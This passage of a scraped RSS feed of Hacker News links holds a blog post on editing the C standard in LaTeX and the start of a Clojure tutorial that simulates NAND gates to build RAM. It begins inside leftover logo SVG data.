C187.191395,21.730803 185.018025,24.435502 179.539082,24.435502 C174.059964,24.435502 171.886595,21.730803 171.886595,15.9529433 Z M182.691751,15.9529433 C182.691751,12.9103114 182.232682,11.066415 179.539082,11.066415 C176.845307,11.066415 176.386239,12.9103114 176.386239,15.9529433 C176.386239,18.9955753 176.845307,20.8396481 179.539082,20.8396481 C182.232682,20.8396481 182.691751,18.9955753 182.691751,15.9529433 Z M196.757347,24.4354843 C191.278228,24.4354843 189.104859,21.7307853 189.104859,15.9529257 C189.104859,10.1750661 191.278228,7.47054355 196.757347,7.47054355 C198.532634,7.47054355 200.124259,7.74706625 201.50164,8.57698726 L200.063097,11.8654368 C199.083446,11.3736252 197.951065,11.1278076 196.757347,11.1278076 C194.063571,11.1278076 193.604503,12.9102937 193.604503,15.9529257 C193.604503,18.9955577 194.063571,20.7780438 196.757347,20.7780438 C197.951065,20.7780438 199.083446,20.5322262 200.063097,20.0405911 L201.50164,23.3290406 C200.124259,24.1589616 198.532634,24.4354843 196.757347,24.4354843 Z M207.990656,15.8607573 L207.990656,24.0666168 L203.521769,24.0666168 L203.521769,2.55308068 L207.990656,2.00003529 L207.990656,14.9387209 L212.3678,7.83930518 L217.357269,8.33111676 L212.337219,15.2768304 L218,23.3905744 L213.163788,24.4354314 L207.990656,15.8607573 Z M70.5211238,46.3708984 C72.1677593,46.3708984 73.1605915,45.933262 73.1605915,44.4258868 C73.1605915,43.0399205 72.3131076,42.7969264 70.4000296,42.2375282 C68.2932711,41.6541307 66.3318608,40.9974995 66.3318608,38.2015675 C66.3318608,35.8430954 68.1721768,34.7975325 70.4242836,34.7975325 C71.8044766,34.7975325 73.0880052,34.9921749 74.2261856,35.6242772 L73.6207144,37.0344194 C72.7730548,36.5724306 71.7076364,36.3536124 70.569456,36.3536124 C69.140755,36.3536124 68.0753366,36.6454876 68.0753366,38.2988004 C68.0753366,39.6604144 69.3103572,40.0736985 70.8842308,40.5113349 C72.7973088,41.0462042 74.9040672,41.5810736 74.9040672,44.2312445 C74.9040672,46.9057678 73.2574317,47.9269782 70.617964,47.9269782 C68.8259803,47.9269782 67.251931,47.6352794 65.9685781,46.8328872 L66.5497953,45.3983926 C67.6877999,46.0548473 69.0681687,46.3708984 70.5211238,46.3708984 Z M77.4462201,41.3622907 C77.4462201,36.888517 78.9960154,34.7975678 82.8947577,34.7975678 C86.7935,34.7975678 88.3432953,36.888517 88.3432953,41.3622907 C88.3432953,45.8360643 86.7935,47.9270135 82.8947577,47.9270135 C78.9960154,47.9270135 77.4462201,45.8360643 77.4462201,41.3622907 Z M86.5270575,41.3622907 C86.5270575,38.2257787 85.9943483,36.3292953 82.8947577,36.3292953 C79.7951671,36.3292953 79.2624579,38.2257787 79.2624579,41.3622907 C79.2624579,44.4988027 79.7951671,46.395286 82.8947577,46.395286 C85.9943483,46.395286 86.5270575,44.4988027 86.5270575,41.3622907 Z M92.4110246,47.6351912 L92.4110246,36.8642176 L90.2801879,36.8642176 L90.2801879,35.3324901 L92.3626924,35.3324901 C92.2658521,34.7489161 92.1930901,34.1409897 92.1930901,33.581768 C92.1930901,31.4664664 93.0407498,29.8860342 95.7529795,29.8860342 C96.2612589,29.8860342 96.7698898,29.9590913 97.2300128,30.0806766 L96.9394921,31.612404 C96.6004633,31.5151711 96.2371806,31.4664664 95.9224059,31.4664664 C94.2755946,31.4664664 93.9124877,32.1716258 93.9124877,33.7033532 C93.9124877,34.1896944 93.9608199,34.8217967 94.1061682,35.3324901 L97.0120783,35.3324901 L96.8424761,36.8642176 L94.2030084,36.8642176 L94.2030084,47.6351912 L92.4110246,47.6351912 Z M100.668527,41.629743 L100.668527,36.6211 L98.5375141,36.6211 L98.5375141,35.0893725 L100.668527,35.0893725 L100.668527,31.2720535 L102.460335,31.0288829 L102.460335,35.0893725 L105.245326,35.0893725 L105.075724,36.6211 L102.460335,36.6211 L102.460335,42.1404365 C102.460335,44.2799139 102.484589,45.4955903 104.034384,46.9787895 L102.823617,48 C100.813699,46.3952155 100.668527,44.3771468 100.668527,41.629743 Z M115.415361,37.326224 L112.436865,47.6352089 L110.330107,47.6352089 L106.552459,35.2838031 L108.417204,34.9433996 L111.492541,45.8846632 L114.471037,35.2109225 L116.311353,34.9921043 L119.217264,45.8846632 L122.19576,34.9433996 L123.987568,35.2350984 L120.33119,47.6352089 L118.224256,47.6352089 L115.415361,37.326224 Z M134.472571,45.9089273 C133.722103,47.2218366 132.462829,47.9269959 130.404402,47.9269959 C127.547,47.9269959 126.166631,46.9543136 126.166631,44.2312622 C126.166631,41.7755571 128.079709,40.5842331 134.254637,40.3167102 L134.254637,40.0250114 C134.254637,37.2532552 132.85019,36.4023347 131.106714,36.4023347 C129.895947,36.4023347 128.709259,36.6696812 127.619586,37.2045505 L127.038369,35.7457036 C128.273566,35.089249 129.629505,34.7975502 131.106714,34.7975502 C133.770435,34.7975502 136.04662,36.1346353 136.04662,39.8305455 L136.04662,43.0884664 C136.04662,44.596018 136.143461,46.1033931 136.482665,47.4406548 L134.981202,47.7810583 C134.763268,47.1733083 134.593841,46.5410296 134.472571,45.9089273 Z M134.254637,41.7999095 C130.065374,41.9945518 127.934361,42.6023017 127.934361,44.2312622 C127.934361,45.7386373 128.442992,46.4437966 130.743431,46.4437966 C132.559493,46.4437966 133.455485,45.4954667 134.254637,43.8908587 L134.254637,41.7999095 Z M139.872232,47.6351912 L139.872232,39.6359738 C139.872232,38.1285987 139.775391,36.6210471 139.436538,35.2837854 L140.93765,34.9433819 C141.179838,35.5998366 141.373695,36.3535241 141.519043,37.1073882 C142.1971,35.7214219 143.335105,34.9433819 145.272437,34.7974443 L145.514625,36.7426323 C143.528961,36.7669847 142.366527,37.6179052 141.664215,39.4171556 L141.664215,47.6351912 L139.872232,47.6351912 Z M152.948458,47.9269606 C149.655187,47.9269606 147.499921,46.5653466 147.499921,41.3622377 C147.499921,35.9159583 149.994216,34.7975149 152.706445,34.7975149 C155.854368,34.7975149 157.670606,36.3050665 157.670606,41.654113 L157.670606,41.8727548 L149.340412,42.5535617 C149.412999,45.4956079 150.720605,46.3952331 152.948458,46.3952331 C154.231811,46.3952331 155.345737,46.1033578 156.483918,45.4227273 L157.137721,46.8085172 C155.878447,47.6352618 154.449745,47.9269606 152.948458,47.9269606 Z M155.902876,40.5113172 C155.854368,37.3504529 154.667856,36.3292424 152.706445,36.3292424 C150.599511,36.3292424 149.291904,37.4963905 149.291904,40.8760731 L149.291904,41.1434195 L155.902876,40.5113172 Z M168.917923,16.5496465 C168.917923,19.0083515 169.376991,20.8215427 170.876873,22.4812083 L167.877286,24.5710987 C164.974715,22.935609 164.479441,19.7461571 164.450442,16.7569944 L164.44886,16.7569944 L164.44886,2.52251672 L168.917923,2 L168.917923,16.5496465 Z M48.8146433,22.4922864 C49.8699564,22.6590279 50,23.5436841 50,24.2058402 L50,25.7941598 C50,26.4563159 49.8699564,27.3409721 48.8146433,27.5077136 C48.1621092,27.6096112 47.4315489,27.7116869 46.6885187,27.8157222 C45.79674,27.9402438 45.0868442,28.6111289 44.8894629,29.4899064 C44.7702859,30.0205933 44.6304445,30.54362 44.4706511,31.0579177 C44.2036163,31.9178121 44.4820522,32.8530608 45.191948,33.4069062 C45.7830231,33.8681175 46.3641222,34.3214904 46.8778837,34.735672 C47.7085597,35.4078041 47.3788189,36.2388394 47.047653,36.8122804 L46.253496,38.1877196 C45.9223301,38.7613388 45.367596,39.46233 44.370179,39.0789671 C43.7527389,38.8404341 43.0672486,38.563066 42.3703572,38.2808881 C41.5361183,37.9431298 40.5869778,38.1688364 39.9763071,38.8299237 C39.6093346,39.2270036 39.2268638,39.6094758 38.8297853,39.9764495 C38.1687005,40.5871224 37.9431727,41.5362663 38.2807518,42.37033 C38.5629287,43.067402 38.8402957,43.7528948 39.079006,44.3703371 C39.4623675,45.3675795 38.7612007,45.9224937 38.1877616,46.2536608 L36.8121493,47.0478206 C36.2387103,47.3789877 35.4076779,47.7087297 34.7355482,46.8780507 C34.3213681,46.3642874 33.8679968,45.7831862 33.4067872,45.192109 C32.8531219,44.4822107 31.9176984,44.2037738 31.0578071,44.4708096 C30.5436893,44.6306035 30.0206645,44.7704454 29.4898014,44.8896228 C28.6112051,45.0870049 27.9403224,45.7969032 27.8156231,46.6886851 C27.7117663,47.4317179 27.6095128,48.1622808 27.5076156,48.8148172 C27.3408747,49.870134 26.4563998,50 25.794246,50 L24.205754,50 C23.5436002,50 22.6589472,49.870134 22.4923844,48.8148172 C22.3904872,48.1622808 22.2882337,47.4317179 22.1841988,46.6886851 C22.0596776,45.7969032 21.3887949,45.0870049 20.5100205,44.8896228 C19.9793355,44.7704454 19.4563107,44.6306035 18.9420148,44.4708096 C18.0823016,44.2037738 17.1468781,44.4822107 16.5930346,45.192109 C16.1318251,45.7831862 15.6784537,46.3642874 15.2642736,46.8780507 C14.5923221,47.7087297 13.7612897,47.3789877 13.1876726,47.0478206 L11.8122384,46.2536608 C11.2387993,45.9224937 10.5376325,45.3675795 10.920994,44.3703371 C11.1595261,43.7528948 11.4368932,43.067402 11.7190701,42.3705081 C12.0568273,41.5362663 11.8311214,40.5871224 11.1702147,39.9764495 C10.772958,39.6094758 10.3904872,39.2270036 10.0235147,38.8299237 C9.41284404,38.1688364 8.46370357,37.9431298 7.62964283,38.2808881 C6.93257326,38.563066 6.24708293,38.8404341 5.62964283,39.0789671 C4.63240403,39.46233 4.07749176,38.7613388 3.74632582,38.1877196 L2.95216888,36.8122804 C2.62118108,36.2388394 2.29144028,35.4078041 3.12211633,34.735672 C3.63587779,34.3214904 4.21697693,33.8681175 4.80787388,33.4069062 C5.51776966,32.8530608 5.79620558,31.9178121 5.52917075,31.0579177 C5.36937739,30.54362 5.22953594,30.0205933 5.11035896,29.4899064 C4.91297764,28.6111289 4.20308186,27.940422 3.31130311,27.8157222 C2.56845106,27.7116869 1.8378908,27.6096112 1.18517859,27.5077136 C0.129865503,27.3409721 0,26.4563159 0,25.7941598 L0,24.2058402 C0,23.5436841 0.129865503,22.6590279 1.18517859,22.4922864 C1.8378908,22.3903888 2.56845106,22.288135 3.31130311,22.1842778 C4.20308186,22.059578 4.91297764,21.3888711 5.11035896,20.5100936 C5.22953594,19.9794067 5.36937739,19.45638 5.52917075,18.9420823 C5.79620558,18.0821879 5.51776966,17.1469392 4.80787388,16.5930938 C4.21697693,16.1318825 3.63587779,15.6785096 3.12211633,15.264328 C2.29144028,14.5921959 2.62118108,13.7611606 2.95216888,13.1877196 L3.74632582,11.8121023 C4.07749176,11.2386612 4.63240403,10.53767 5.62964283,10.9210329 C6.24708293,11.1595659 6.93257326,11.436934 7.62964283,11.7191119 C8.46370357,12.0568702 9.41284404,11.8311636 10.0235147,11.1702545 C10.3904872,10.7729964 10.772958,10.3905242 11.1702147,10.0235505 C11.8311214,9.41287757 12.0568273,8.46373373 11.7190701,7.62967001 C11.4368932,6.93259796 11.1595261,6.24710518 10.920994,5.62966288 C10.5376325,4.63242053 11.2387993,4.07750629 11.8122384,3.74633917 L13.1876726,2.9521794 C13.7612897,2.62101228 14.5923221,2.2912703 15.2642736,3.12194931 C15.6784537,3.63571261 16.1318251,4.21681381 16.5930346,4.80789101 C17.1468781,5.51778932 18.0823016,5.79622623 18.9420148,5.52919045 C19.4563107,5.36939652 19.9793355,5.22955457 20.5100205,5.11037716 C21.3887949,4.91299515 22.0596776,4.20309683 22.1841988,3.31131491 C22.2882337,2.56828206 22.3904872,1.8377192 22.4923844,1.18518281 C22.6589472,0.129865965 23.5436002,0 24.205754,0 L25.794246,0 C26.4563998,0 27.3408747,0.129865965 27.5076156,1.18518281 C27.6095128,1.8377192 27.7117663,2.56828206 27.8156231,3.31131491 C27.9403224,4.20309683 28.6112051,4.91299515 29.4898014,5.11037716 C30.0206645,5.22955457 30.5435112,5.36939652 31.0578071,5.52919045 C31.9176984,5.79622623 32.8531219,5.51778932 33.4067872,4.80789101 C33.8679968,4.21681381 34.3213681,3.63571261 34.7355482,3.12194931 C35.4076779,2.2912703 36.2387103,2.62101228 36.8121493,2.9521794 L38.1877616,3.74633917 C38.7612007,4.07750629 39.4623675,4.63242053 39.079006,5.62966288 C38.8402957,6.24710518 38.5629287,6.93259796 38.2807518,7.62967001 C37.9429946,8.46373373 38.1687005,9.41287757 38.8297853,10.0235505 C39.2268638,10.3905242 39.6093346,10.7729964 39.9763071,11.1700763 C40.5869778,11.8311636 41.5361183,12.0568702 42.3703572,11.7191119 C43.0672486,11.436934 43.7527389,11.1595659 44.370179,10.9210329 C45.367596,10.53767 45.9223301,11.2386612 46.253496,11.8121023 L47.047653,13.1877196 C47.3788189,13.7611606 47.7085597,14.5921959 46.8778837,15.264328 C46.3641222,15.6785096 45.7830231,16.1318825 45.191948,16.5930938 C44.4820522,17.1469392 44.2036163,18.0821879 44.4706511,18.9420823 C44.6304445,19.45638 44.7702859,19.9792286 44.8894629,20.5100936 C45.0868442,21.3888711 45.79674,22.059578 46.6885187,22.1842778 C47.4315489,22.288135 48.1621092,22.3903888 48.8146433,22.4922864 Z M41,25 C41,16.1633605 33.8365022,9 25.0000885,9 C16.1633209,9 9,16.1633605 9,25 C9,33.8366395 16.1633209,41 25.0000885,41 C33.8365022,41 41,33.8366395 41,25 Z M33.4929285,21.4251409 L34.1463574,22.930446 C34.2241211,23.1098356 34.1570343,23.3191532 33.9894063,23.4196256 L26.4616279,28.0326286 L26.4529084,28.0379729 L26.4449007,28.0440297 C26.2973809,28.1571503 26.1375827,28.252991 25.9683532,28.3294142 L25.9598116,28.3331552 L25.955007,28.3361836 L25.9510921,28.3376088 L25.9411269,28.3420623 C25.829019,28.3914078 25.7147758,28.4371905 25.5959058,28.4674747 C24.7120329,28.6924688 23.8326087,28.4462758 23.2188625,27.8364936 L15.5003227,18.1663781 C15.3764701,18.011394 15.3889266,17.7880032 15.5289725,17.6478049 L16.672473,16.5032386 C16.745966,16.4296657 16.84366,16.3892274 16.9475823,16.3892274 C17.0378024,16.3892274 17.1258872,16.4209367 17.1954653,16.4784768 L25.3885952,23.263929 C25.4636897,23.3262789 25.5649427,23.3469434 25.6583659,23.318975 L33.0251004,21.2072725 C33.0614021,21.1964058 33.0987714,21.1908834 33.1363186,21.1908834 C33.2911343,21.1908834 33.4311802,21.282805 33.4929285,21.4251409 Z" id="logo-post-October192020"></path>
    </defs>
    <g id="logo-logo-post-October192020" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <mask fill="white">
            <use xlink:href="#logo-post-October192020"></use>
        </mask>
        <use fill="#000000" xlink:href="#logo-post-October192020"></use>
    </g>
</svg></span></span></p><p>10.19.20.856</p>

        </div>

        

        <!--?xml version="1.0" encoding="UTF-8"?-->
<svg width="830px" height="117px" viewBox="0 0 830 117" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <title>Accent</title>
    <g id="a330bf-October192020" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <polygon fill="#a330bf" fill-rule="nonzero" points="830 0 1.13861509e-13 117 0 1.42755282e-14"></polygon>
    </g>
</svg>
        <!--?xml version="1.0" encoding="UTF-8"?-->
<svg width="830px" height="117px" viewBox="0 0 830 117" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <title>Accent</title>
    <g id="a330bf-flipped-October192020" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <polygon fill="#a330bf" fill-rule="nonzero" points="0 0 830 0 830 117"></polygon>
    </g>
</svg>

    </div>

</section>



<section id="subscription">
    <div>
        <div>
            
            <p>Interested in future posts or announcements? <span>Subscribe to our feed.</span></p>
        </div>
        
    </div>
</section>

    </div><div>
        
        
        
            
                <section id="hello">
                    
                    <div>
                        <p>Contact us about your design and development needs today.</p>

                        <p><a href="https://steamclock.com/contact">Get in Touch <span></span></a>
                    </p></div>
                </section>
            
        
        

        

        <section id="links">
            
                
                
                
            
                
                
                
            
                
                
                
            
                
                
                
            
            
        </section>
        
        <p>© Steamclock Software Ltd. No developers were harmed in the making of this site.</p>
    </div></div>]]>
            </description>
            <link>https://steamclock.com/blog/2020/10/microcopy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086825</guid>
            <pubDate>Fri, 13 Nov 2020 20:07:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Editing the C Standard]]>
            </title>
            <description>
<![CDATA[
Score 51 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25086673">thread link</a>) | @trollied
<br/>
November 13, 2020 | https://thephd.github.io/editing-the-c-standard | <a href="https://web.archive.org/web/*/https://thephd.github.io/editing-the-c-standard">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
      <p>… I did it. I survived the Paper Blitz.<!--more--></p>



<p>For those of you who saw one of my earlier posts about <a href="https://thephd.github.io/your-c-compiler-and-standard-library-will-not-help-you">why most C implementations will purposefully blow your leg off even in the simplest of scenarios</a>, you may have noticed that I said I became the Project Editor for C. That’s a fancy way of saying I glue the standard together and produce both the Working Drafts/Working Papers (WDs/WPs), an Editor’s Report, and a Diffmark of the WD against the last published WD.</p>

<p>The <a href="https://drive.google.com/file/d/1IbngZ8StYVVYASd3WWuC4Uu9Xs39AF_N/view?usp=sharing">Working Draft is here</a> and the <a href="https://drive.google.com/file/d/1x4-eIBbQU3aXuORoNPSixbbl_ZKKfWfu/view?usp=sharing">Diffmarks are here</a> until I can publish it O f f i c i a l l y through the ISO® N-Paper™ System©.</p>

<p>Silly symbols aside, this was a slog through 30+ papers, a few defect reports, several editorial issues, and a minor cleanup of some of the sources. There was a backlog of about 3 meetings worth of papers to integrate, give or take a few from a few missed integrations in the past and a few things early-integrated from the meetings I had to cover. Despite some pretty crazy shenanigans when I was first handling becoming the Project Editor, everything ended up turning out smoothly! For the most part, anyways: I can already smell the editorial reports for all the things I probably messed up integrating. But what is it like, editing a Standards Document? What’s it like taking all those documents and turning them into a Working Draft?</p>

<p><img src="https://thephd.github.io/assets/img/2020-09-11/papers.png" alt="Image of a few of the papers from "></p>



<p>As with any project, it needs tools. This standard is built with a suite of tools any *Nix programmer will find comforting:</p>

<ul>
  <li><code>make</code>, for general build purposes</li>
  <li><code>sed</code> and <code>awk</code> for some reserved identifier / keyword shenanigans</li>
  <li><code>latex</code>, with the usual <code>pdflatex</code> and other shenanigans</li>
  <li><code>git</code>, to pull a previously tagged version of the standard to attempt to create useful diffmarks</li>
</ul>

<p>There’s also a bunch of other side tools used to generate some docs and other things, but that’s the core of it! As usual, nothing that discusses LaTeX would be complete without me saying the following…</p>

<h3 id="latex-is-horseshit">LaTeX is horseshit</h3>

<p>Boooiiiiiiiiiiii, do I hate LaTeX. The available LaTeX distributions are piss-tier garbage, printing a line number but not tracking any file information which makes any stream of multi-compilation completely useless and requiring separate invocations of the latex compiler for each file and magic to know which file you’re in. Not that that is how most people organize documents: <code>\input{the_file}</code> is the choice of developing a modular document in LaTeX land, complete with <code>#include</code>-like behavior but with 0% of the compiler Quality of Implementation.</p>

<p>Changing one thing of course results in a cascade of errors, warnings are split over multiple lines so as to make most error-parsing and warning-parsing regexen useless for trying to pick errors out of the literal 1 MB dump of errors, and trying to edit anything beyond the most basic of syntax is a complete slog. There is no reasonability, particular form, or dependable structure to LaTeX errors, other than “hard errors” starting with <code>!</code>.</p>

<p>Whitespace is not significant in the language (except when it is), people slap ad-hoc commands together to patch over LaTeX’s gross inefficiencies, adding that footnote catapults the next 3 paragraphs of text to write into the margins to the right, and have you heard of our Lord and Savior <code>OVERFULL HBOX</code>?</p>

<p>My eternal advice to everyone is to stop writing documents in LaTeX, please. You’d get farther and faster in even Microsoft Word, and it would render better for the internet. It has math support and it doesn’t poo all over the bed and scream when you want to try to add a mild margin to your author and title names, gargling with cryptic hints as to what will satisfy it enough to stop besmearing the nice linens in its dreadful output.</p>

<p>If your hands shake at the thought of not using BEAUTIFUL, LAYOUT-POWERFUL, HAND-BAKED LATEX on your résumé, there’s templates that make your Word Documents look like LaTeX ones. Just using a different Serif-y font will probably go a long way towards that look!</p>

<p>… That being said, the C Standard is written in LaTeX, so that’s what we’re editing.</p>

<h3 id="the-c-standard-is-mostly-nice">The C Standard is Mostly Nice</h3>

<p>Don’t get me wrong: LaTeX is garbage, but the Standard I was handed is of pretty good quality for a LaTeX document. It was easy to build and edit, I did not get lost once I had all the proper things installed (I did not decide to try to figure out the “minimum required distribution” and instead just shotgun <code>apt get install</code>d <code>texlive-full</code>), and the files were orderly. Referencing things is kind of terrible but that’s more of a LaTeX problem than a structure problem. I am also lucky to even be getting a LaTeX document: the standard used to be written in some God Awful Rotten Badness by the name of “TROFF”. I don’t know too much about it, and from the little that I did learn</p>

<p>I plan to keep it that way. 😄</p>

<p>There’s also the use of <code>latexdiff</code> and other things to produce nice diffmarks. It works out pretty decently, some of the marks are incredibly noisy. Still: as long as it highlights the general area of changes, it produces a pretty good proxy of “places to look for things that have changed”. It does ignore newly added files, which is why the lists at the beginning of the Working Paper – which detail the list of documents added from each meeting – are not all blue-highlighted. Having a nice LaTeX document with some really nice organization left to me by the last editor made the next part of this article the easiest…</p>



<p>Sweet, You Wrote a <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2335.pdf">Sick-Nasty Rad Paper</a> And Now It Needs To Be Put In The C Standard! So, how does it get there? Well, you don’t actually write a diff to the standard. At least, not a <em>real</em> diff: the sources to the C standard are hidden from the world to keep them safe, even when the time of Darkness descends upon us. What you write are <em>instructions to the project editor</em> (Hi, That’s Me!), and then I take your instructions and do my Best Effort™ to reflect them in the C Standard. Most of the wording gets approved by the Committee before-hand, and the edits are usually straightforward and simple. <a href="http://www.open-std.org/jtc1/sc22/wg14/www/docs/n2517.pdf">For example</a>:</p>

<blockquote>
  <p>RECOMMENDATION: 3.4.3p4 should use a different example of undefined behavior, such as:</p>
  <blockquote>
    <p>EXAMPLE An example of undefined behavior is the behavior on dereferencing a null pointer.</p>
  </blockquote>
</blockquote>

<p>I then take these recommendations/instructions/suggestions and then go beat the LaTeX up on your behalf. One of the biggest benefits of this is that you don’t have to know LaTeX. Or how to build the standard, or any part of that. The Project Editor is the “Layer of Indirection” between you and the actual text of the standard. This also means that I could, in theory, rewrite the entire Standard as a Microsoft Word Document, or rewrite the entire thing in restructuredText and not one of you would know the difference. Or, so that’s the ideal situation, anyhow. Unfortunately, following people’s Standard-editing directives are not always the most straight forward…</p>

<h3 id="instructions-unclear">Instructions Unclear?!</h3>

<p>Accidentally blew off foot.</p>

<p>What the hell does “3.4.3p4” mean? Well, I have to build the standard (or go look at an older one), figure out what section/paragraph you’re referring to, and then fix it. Normally, the C standard evolves at such a devastatingly snail-like pace that this is normally not a problem. However, doing this was a bit tough because of 3 meetings of backlogged changes. There were lots of overlaps between papers, and also just out-and-out strange descriptions for how to change some things that I did not understand at first. Weird nesting in the recent C Floating Point Group’s changes to the standard have been all sorts of fun to integrate.</p>

<p>“Delete these paragraphs, then add some here” okay, is that before or after the stuff you just asked me to destroy? Oh, I just applied a paper that deletes half of what you’re asking me to edit. Uh, well, I guess we’re going to have to brew up some interesting words on the fly…!</p>

<p>“Do these changes, and then make similar changes to the usual places” uh, what are “the usual places”? Guess it’s time to break out find/replace and figure out what the usual places are! Wait, hold on, you made these changes here, but… there’s identical wording somewhere else, am I supposed to edit that too…? Time to e-mail the author…</p>

<p>It’s an interesting bucket of challenges, really. I think one of the ways to help make it so I can more reliably know what sections to edit are by adding stable tags to the standard. C++ has done this and it means when someone says “edit <code>[alg.any.of]</code>”, you know where to go no matter what happens to the section and paragraph numbers. <code>25.6.2</code>… what’s that, what am I doing again?</p>

<p>Some frustrations go beyond just the papers’ contents, though.</p>

<h3 id="n2481-nooo-you-mean-n2553">N2481? Nooo, you mean N2553!</h3>

<p>One of the biggest problems in both the C and C++ Committees are history. C++ began to address this problem by using P-numbers for their papers, which are <code>PNNNNrXYZ</code> numbers that indicate both a paper uniquely and the revision of the paper (0, 1, 2, …) in the <code>XYZ</code> part. C has no such infrastructure: every paper is submitted, officially, to ISO and is given an N-number.</p>

<p>How do you track revision history? You hope the author puts it in the paper title or inside the paper itself. It’s basically up to the author to do this, and not all authors do it. This is a larger problem that is more strictly outside of my purview as Project Editor, but it is something that I am going to tackle anyways.</p>

<p>I had some inspiration thanks to the <a href="https://github.com/LynnKirby/wg14-link">work done by LynnKirby</a>, wherein Lynn created a <a href="https://wg14.link/">wg14.link website, similar to the wg21.link website</a>. This has given me a lot of insight into what people want out of a service like this, and how I should book keep papers and their metadata. Hopefully before Summer of 2021, I will be able to unveil a new way to track these papers and keep title, author, abstract, and history information and make the Paper Submission Process far more friendly to the wider C Community!</p>

<p>Still, this is a lot of rambling and anymore stuff will start to get way off topic to what it means to actually edit the C Standard. …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thephd.github.io/editing-the-c-standard">https://thephd.github.io/editing-the-c-standard</a></em></p>]]>
            </description>
            <link>https://thephd.github.io/editing-the-c-standard</link>
            <guid isPermaLink="false">hacker-news-small-sites-25086673</guid>
            <pubDate>Fri, 13 Nov 2020 19:57:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simulating RAM in Clojure]]>
            </title>
            <description>
<![CDATA[
Score 135 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25086256">thread link</a>) | @stopachka
<br/>
November 13, 2020 | https://stopa.io/post/258 | <a href="https://web.archive.org/web/*/https://stopa.io/post/258">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span><p>“Computers are all made out of logic gates”. We’ve heard that saying before. We also have a sense that logic gates are very simple machines, analogous to light switches even. This raises the question: <em>how exactly do kind-of-light-switches come together to form computers</em>? How does “storing a variable” or “calling a function” translate into logic gates going on or off? </p><p>On a journey to answer that question, I discovered J Clark Scott’s excellent book <a href="https://www.amazon.com/But-How-Know-Principles-Computers-ebook/dp/B00F25LEVC" target="_blank">“How do It Know?</a>”. He starts with NAND gates and takes you on a journey to build a computer using them.</p><p>I liked his book so much that I took his schematic for RAM, and simulated it in Clojure. In this essay, I’ll guide you through doing just that: we’ll simulate NAND gates, and use about <em>14 thousand</em> of them to build 256 bytes of RAM.</p><p>Going through this simulation ingrained an “aha” feeling in me: watching 14 thousand little machines chug away makes you feel that whoever uses a computer is a wizard. A wizard with an army of millions of machine servants doing billions of little jobs for them every second. I hope it gives you the same feeling. 🙂</p><p>To grok this essay, you need to understand this picture:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc" alt="image"></span></p><p>This describes a NAND gate. A NAND gate is a machine that has two input wires. If both input wires have a “high” charge (represented as 1), the output charge is “low” (represented as zero). With any other combination of input charges, the output charge is high.</p><p>Notice that the wires carry a charge, but we choose to interpret <em>meaning</em> in the charge. “high charge” means 1, and “low charge” means 0. Nothing changes in the machine, this is just something we decided as humans (1).</p><p>On the left you see a circuit diagram. You can read it as input wires <code>a</code> and <code>b</code> carrying charges into the <code>NAND</code> gate. The <code>NAND</code> gate has a wire <code>c</code>, carrying the output charge. For all the circuit diagrams we’ll draw, you can read them as electricity “flowing” from left to right, or top to bottom.</p><p>On the right is a “truth” table for a NAND gate. This is just a fancy name for summarizing every state a <code>NAND</code> gate can be, based on the input wires.</p><p>Now, we can start even lower than a <code>NAND gate</code>, but this machine is simple enough. It can’t be so hard to build something that turns off when two inputs are turned on. You don’t have to take my word for it though, you can search up “building a NAND gate with transistors”, and come back when you’re convinced. </p><p>Time to code! 🙂</p><p>First things first, we need some way to represent the state of our circuit. We know that our RAM will be built completely from <code>NAND</code> gates, so let’s take inspiration from one:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc" alt="image"></span></p><p>If we look at this example we can see that:</p><ol><li>We have wires. </li><li>Wires have charges.</li><li>We hook wires together with NAND Gates</li></ol><p>Here’s one way we can map that to a data structure in Clojure: </p><pre><code><span>(</span><span>def</span><span> ex-state-v0 {</span><span>:charge-map</span><span> {</span><span>:a</span><span> </span><span>1</span><span> </span><span>:b</span><span> </span><span>1</span><span> </span><span>:c</span><span> </span><span>0</span><span>}</span>
<span>                  </span><span>:nand-gates</span><span> [{</span><span>:ins</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>]</span>
<span>                                </span><span>:out</span><span> </span><span>:c</span><span>}]})</span></code></pre><p>We can use keywords to represent our wires. We can also keep a map that tells us the charges of our wires. Finally, we can keep a list of NAND gates, which tell us how these wires connect. </p><p>Fine enough way to represent our circuit for now! Let’s create a few functions that can help us manage this representation:</p><pre><code><span>; update state v0</span>
<span>; ---------------</span>
<!-- -->
<span>(</span><span>def</span><span> empty-state {</span><span>:charge-map</span><span> {} </span><span>:nand-gates</span><span> []})</span>
<!-- -->
<span>(</span><span>defn</span><span> charge [state wire]</span>
<span>  (</span><span>get-in</span><span> state [</span><span>:charge-map</span><span> wire]))</span>
<!-- -->
<span>(</span><span>defn</span><span> charges [state wires]</span>
<span>  (</span><span>map</span><span> (</span><span>partial</span><span> charge state) wires))</span>
<!-- -->
<span>(</span><span>defn</span><span> set-charge [state wire charge]</span>
<span>  (</span><span>assoc-in</span><span> state [</span><span>:charge-map</span><span> wire] charge))</span>
<!-- -->
